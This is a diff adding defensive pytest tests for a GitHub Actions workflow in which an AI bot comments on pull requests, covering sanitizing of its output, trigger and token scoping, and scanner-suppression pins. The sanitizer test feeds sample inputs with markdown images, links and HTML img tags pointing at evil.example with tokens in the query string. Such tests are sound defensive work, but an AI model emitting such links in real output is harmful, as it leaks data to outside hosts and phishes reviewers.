@@ -624,6 +624,90 @@ def test_ai_text_cannot_forge_a_marker_or_a_mention():
     assert sanitize("x" * 300, 100).endswith("… _(truncated)_")
 
 
+def test_ai_text_strips_markdown_images_and_links():
+    """#373: markdown image/link syntax must not survive into the comment.
+
+    `![](url)` is fetched server-side by GitHub's camo proxy the moment the
+    comment renders -- a request to an attacker-controlled host that confirms
+    the workflow ran and when. `[text](url)`, a reference-style `[label]: url`
+    definition, an autolink, and an HTML `<img>` are all the same
+    reviewer-phishing primitive under a trusted bot identity. Adversarial
+    inputs: reference-style links, nested brackets, `![]()`, autolinks, HTML
+    `<img>`, and a URL that smuggles a token in its query string.
+    """
+    content = "\n".join(_read_lines(SCRIPT_PATH))
+
+    # Pin the JS itself, not only the Python model of it below. Without these,
+    # deleting the escaping from prod-igy.js leaves this test green -- the
+    # re-implementation would happily keep testing itself.
+    body = content[content.index("function sanitizeAiText(") :]
+    body = body[: body.index("\n}")]
+    assert "s.replace(/<img\\b/gi, '&lt;img')" in body, "HTML <img> escaping was removed"
+    assert "s.replace(/!\\[/g, '!' + ZWSP + '[')" in body, "image-embed defanging was removed"
+    assert "s.replace(/\\]\\(/g, ']' + ZWSP + '(')" in body, (
+        "link/image-close defanging was removed"
+    )
+    assert "s.replace(/\\bhttps?:\\/\\//gi, (m) => m.replace('//', '/' + ZWSP + '/'))" in body, (
+        "bare-URL defanging was removed"
+    )
+
+    zwsp = "​"
+
+    def sanitize(text, max_chars=4000):
+        s = "" if text is None else str(text)
+        s = s.replace("<!--", "&lt;!--").replace("-->", "--&gt;")
+        s = re.sub(r"@(?=[A-Za-z0-9])", "@" + zwsp, s)
+        s = re.sub(r"<img\b", "&lt;img", s, flags=re.I)
+        s = s.replace("![", "!" + zwsp + "[")
+        s = s.replace("](", "]" + zwsp + "(")
+        s = re.sub(
+            r"\bhttps?://", lambda m: m.group(0).replace("//", "/" + zwsp + "/"), s, flags=re.I
+        )
+        if len(s) > max_chars:
+            s = s[:max_chars] + "… _(truncated)_"
+        return s.strip()
+
+    # Plain image embed with a token smuggled in the query string.
+    img = sanitize("Summary: ![pixel](https://evil.example/p.png?token=SECRET123) done.")
+    assert "![" not in img and "!" + zwsp + "[" in img
+    assert "](" not in img and "]" + zwsp + "(" in img
+    assert "://" not in img
+    assert "https:" + zwsp not in img  # zwsp lands between the slashes, not after the colon
+    assert "https:/" + zwsp + "/" in img
+    # The token text itself is not redacted -- only the link is neutralised.
+    assert "SECRET123" in img
+
+    # Nested brackets in the alt text must not hide the destination: only the
+    # two-character trigger sequences are matched, not a balanced-bracket span.
+    nested = sanitize("![alt with [nested] brackets](https://evil.example/?x=1)")
+    assert "![" not in nested and "](" not in nested
+    assert "://" not in nested
+
+    # An inline (non-image) link is the same primitive.
+    inline = sanitize("See [the details](https://evil.example/confirm) for context.")
+    assert "](" not in inline and "://" not in inline
+
+    # Reference-style: the destination lives in a separate definition line.
+    ref = sanitize("See [details][1] for more.\n\n[1]: https://evil.example/?token=SECRET")
+    assert "://" not in ref
+    assert "https:/" + zwsp + "/" in ref
+
+    # Autolink form.
+    auto = sanitize("Source: <https://evil.example/x>")
+    assert "://" not in auto
+
+    # HTML <img>, including a mixed-case tag name.
+    html_img = sanitize('Rendered via <img src="https://evil.example/?token=SECRET">.')
+    assert "<img" not in html_img
+    assert "&lt;img" in html_img
+    assert "://" not in html_img
+
+    # Ordinary prose that happens to mention a URL stays readable -- the fix
+    # breaks the scheme's `//`, it does not scrub every "http" substring.
+    prose = sanitize("Rewrites _lines() to drop the trailing CR.")
+    assert prose == "Rewrites _lines() to drop the trailing CR."
+
+
 def test_summary_step_does_exactly_two_things():
     """The schema is the whole contract, and it has two fields.
 
@@ -937,6 +1021,101 @@ def test_ai_prompt_frames_pr_text_as_data():
     assert "tools:" not in call, "the AI step must not declare tools"
 
 
+def test_iss374_edited_does_not_retrigger_the_privileged_job():
+    """#374: `edited` fires whenever a PR's title or body changes -- which the
+    author (including a fork author) controls and can pull at will, against a
+    job holding pull-requests: write, issues: write and an API key. It must
+    not be in the trigger's `types:` list."""
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    trigger = content.split("pull_request_target:", 1)[1].split("workflow_dispatch:", 1)[0]
+    types_line = next(line for line in trigger.split("\n") if "types:" in line)
+    types = re.search(r"types:\s*\[([^\]]*)\]", types_line)
+    assert types, types_line
+    values = [t.strip() for t in types.group(1).split(",")]
+    assert "edited" not in values, values
+    assert set(values) == {"opened", "synchronize", "reopened"}, values
+
+
+def test_iss375_app_token_probe_env_is_job_level_not_step_level():
+    """#375: the app-token step's `if:` used to read `env.HAS_APP_ID` /
+    `env.HAS_PRIVATE_KEY` from an `env:` block declared on that same step,
+    which works only if the step's own `env:` is guaranteed resolved before
+    its `if:` evaluates -- behaviour GitHub documents loosely. Promoting the
+    probes to job level removes the ordering question: every step's `if:`
+    reads the same job-level env the normal way.
+    """
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+
+    # HAS_APP_ID / HAS_PRIVATE_KEY appear once each, at job level -- between
+    # the job's `permissions:` block and its first step -- not inside the
+    # app-token step body.
+    job_start = content.index("  triage:")
+    steps_start = content.index("    steps:", job_start)
+    job_header = content[job_start:steps_start]
+    assert "HAS_APP_ID: ${{ secrets.PRODIGY_APP_ID }}" in job_header
+    assert "HAS_PRIVATE_KEY: ${{ secrets.PRODIGY_PRIVATE_KEY }}" in job_header
+
+    steps_body = content[steps_start:]
+    token_step_start = steps_body.index("Generate prod-igy token")
+    token_step_end = steps_body.index("\n\n", token_step_start)
+    token_step = steps_body[token_step_start:token_step_end]
+    # The step's `if:` still legitimately reads `env.HAS_APP_ID` /
+    # `env.HAS_PRIVATE_KEY` (now resolving against the job-level env checked
+    # above) -- what must be gone is a step-level `env:` block that assigns
+    # them, the pattern this issue moved away from.
+    assert "HAS_APP_ID: ${{ secrets.PRODIGY_APP_ID }}" not in token_step, (
+        "the probe env must not remain step-level"
+    )
+    assert "HAS_PRIVATE_KEY: ${{ secrets.PRODIGY_PRIVATE_KEY }}" not in token_step, (
+        "the probe env must not remain step-level"
+    )
+    assert "\n        env:" not in token_step, "the step must not declare its own env: block"
+
+    # The gate itself is unchanged.
+    assert "if: ${{ env.HAS_APP_ID != '' && env.HAS_PRIVATE_KEY != '' }}" in content
+
+
+def test_iss375_the_fallback_identity_is_logged():
+    """#375 (acceptance): the GITHUB_TOKEN fallback is no longer silent --
+    a run log line says which identity is posting."""
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    assert "steps.app-token.outputs.token" in content
+    assert "::notice::" in content
+    assert "github-actions[bot]" in content
+    assert "GITHUB_TOKEN fallback" in content
+
+
+def test_github_app_token_is_scoped_to_the_job_permissions():
+    """The app token must not inherit the App installation's full permission
+    grant: each `permission-<name>` input narrows it to something the job
+    actually does, and never to more than the job's own `permissions:` block.
+
+    `permission-issues` and `permission-checks` must NOT come back.
+    `permission-*` requests that exact set and the API answers 422 "The
+    permissions requested are not granted to this installation" when any one of
+    them is absent from the installation's grant -- so an extra entry mints
+    nothing at all rather than a slightly wider token, and the job silently falls
+    back to github-actions[bot]. prod-igy is installed with pull_requests: write,
+    contents: read and metadata: read; `issues` and `checks` are absent and both
+    were requested here (probed per permission, actions/runs/36200243473). It
+    stayed invisible because `pull_request_target` runs the workflow from the base
+    branch, and main did not carry this block yet.
+    """
+    content = "\n".join(_read_lines(WORKFLOW_PATH))
+    start = content.index("Generate prod-igy token")
+    end = content.index("\n\n      - name:", start)
+    step = content[start:end]
+    requested = set(re.findall(r"^\s+(permission-[\w-]+: \w+)$", step, re.M))
+    assert requested == {
+        "permission-contents: read",
+        "permission-pull-requests: write",
+    }
+
+    # and a failed mint falls through to the GITHUB_TOKEN fallback rather than
+    # costing the PR its labels and its rebase warning
+    assert "continue-on-error: true" in step
+
+
 def test_ai_diff_budget_is_per_file():
     """One generated file must not consume the whole diff allowance.
 
@@ -954,3 +1133,57 @@ def test_ai_diff_budget_is_per_file():
     assert per_file(60000, 4) == 15000
     # A floor, so a 100-file PR still shows something of every file.
     assert per_file(60000, 500) == 600
+
+
+def test_zizmor_ignore_pins_still_point_at_what_they_suppress():
+    """`.github/zizmor.yml` suppresses findings by `file:line`.
+
+    Its own header says a shifted line number un-ignores the finding rather than
+    silently keeping it suppressed -- but the reverse is worse and just as quiet:
+    an edit above a pinned line slides the pin onto unrelated YAML, where it
+    suppresses whatever finding lands there next. Only zizmor itself can prove a
+    pin still matches, and zizmor is not a dependency of the pytest environment,
+    so this pins the *construct* each entry was written for.
+
+    The window is **per pin and tight**, which is the whole detector. An earlier
+    version of this test used a blanket 12-line window for every entry, and that
+    is exactly why it stayed green while `ci.yml:313` had drifted 4 lines off its
+    `uses: ./`: 317 fell comfortably inside 313..324, so the pin was un-anchored
+    and a real `self-repository` finding went unsuppressed and unnoticed. Most
+    entries anchor directly *on* their construct (window 1). The one exception is
+    `dangerous-triggers`, which zizmor reports against the whole `on:` mapping
+    rather than the individual trigger, so the needle sits a few lines inside it.
+    """
+    config = REPO_ROOT / ".github" / "zizmor.yml"
+    # (file, line) -> (construct, lines_to_search_from_that_line_inclusive)
+    expected = {
+        # artipacked: checkout steps that deliberately persist credentials.
+        # lockfile.yml is deliberately absent -- its checkout now sets
+        # `persist-credentials` explicitly, so it needs no ignore.
+        ("publish.yml", 85): ("actions/checkout@", 1),
+        ("publish.yml", 435): ("actions/checkout@", 1),
+        # dangerous-triggers: reported against the `on:` mapping, not the trigger.
+        ("prod-igy.yml", 16): ("pull_request_target:", 8),
+        # self-repository: jobs that run this repo's own composite action
+        ("ci.yml", 317): ("uses: ./", 1),
+        ("index-repo.yml", 59): ("uses: ./", 1),
+        ("self-index.yml", 34): ("uses: ./", 1),
+        # adhoc-packages: the one pinned npm dependency prod-igy.js has
+        ("prod-igy.yml", 168): ("npm install", 1),
+    }
+
+    pinned = {
+        (m.group(1), int(m.group(2)))
+        for m in re.finditer(r"^\s+- ([\w-]+\.yml):(\d+)", config.read_text(encoding="utf-8"), re.M)
+    }
+    assert pinned == set(expected), "a zizmor ignore was added or removed without a pin check here"
+
+    for (name, lineno), (needle, span) in sorted(expected.items()):
+        lines = _read_lines(WORKFLOW_DIR / name)
+        window = lines[lineno - 1 : lineno - 1 + span]
+        assert any(needle in line for line in window), (
+            f"zizmor.yml pins {name}:{lineno} for {needle!r}, which is not in the "
+            f"{span}-line window starting there; the line is now {lines[lineno - 1]!r}. "
+            f"Re-run `uvx zizmor==1.30.1 --config .github/zizmor.yml --format plain .` "
+            f"and re-anchor the pin."
+        )
